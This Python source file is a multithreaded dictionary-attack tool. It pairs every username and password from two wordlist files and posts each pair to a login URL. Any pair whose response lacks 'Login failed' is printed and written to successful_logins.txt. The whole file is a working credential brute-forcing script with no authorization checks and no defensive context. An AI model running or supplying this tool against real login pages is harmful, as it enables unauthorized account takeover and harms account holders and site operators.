import argparse
import requests
import threading
import time
from queue import Queue

def try_credentials(url, username, password, successful_logins):
    """
    Tries a single set of username and password credentials against the given URL.
    Adds successful logins to the given list.
    """
    data = {
        "username": username,
        "password": password,
        "submit": "Login"
    }
    response = requests.post(url, data=data)
    if "Login failed" not in response.text:
        print("Login succeeded with username:", username, "and password:", password)
        successful_logins.append((username, password))

def worker(url, credentials_queue, successful_logins):
    """
    Worker function that tries credentials from the queue until the queue is empty.
    """
    while not credentials_queue.empty():
        username, password = credentials_queue.get()
        try_credentials(url, username, password, successful_logins)
        credentials_queue.task_done()

def run_dictionary_attack(url, username_file, password_file, num_threads):
    """
    Runs a dictionary attack using the given URL, username file, and password file.
    Uses the specified number of threads to speed up the attack.
    """
    # Read in the usernames and passwords
    with open(username_file, "r") as f:
        usernames = {line.strip() for line in f.readlines()}
    with open(password_file, "r") as f:
        passwords = {line.strip() for line in f.readlines()}

    # Create a queue of credentials to try
    credentials_queue = Queue()
    for username in usernames:
        for password in passwords:
            credentials_queue.put((username, password))

    # Try the credentials using multiple threads
    successful_logins = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(url, credentials_queue, successful_logins))
        t.start()

    # Wait for all threads to finish
    credentials_queue.join()

    # Write the successful logins to a file
    with open("successful_logins.txt", "w") as f:
        for username, password in successful_logins:
            f.write(username + ":" + password + "\n")

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="Test login credentials using a dictionary attack.")
    parser.add_argument("url", help="The URL to test.")
    parser.add_argument("username_file", help="The file containing the usernames to test.")
    parser.add_argument("password_file", help="The file containing the passwords to test.")
    parser.add_argument("-t", "--threads", type=int, default=4, help="The number of threads to use.")
    args = parser.parse_args()

    # Run the dictionary attack
    start_time = time.time()
    run_dictionary_attack(args.url, args.username_file, args.password_file, args.threads)
    end_time = time.time()

    # Print some statistics
    num_credentials = sum(1 for line in open(args.username_file)) * sum(1 for line in open(args.password_file))
    print("Tried {} credentials in {:.2f} seconds ({:.2f} credentials per second).".format(num_credentials, end_time - start_time, num_credentials / (end_time - start_time)))

if __name__ == "__main__":
    main()
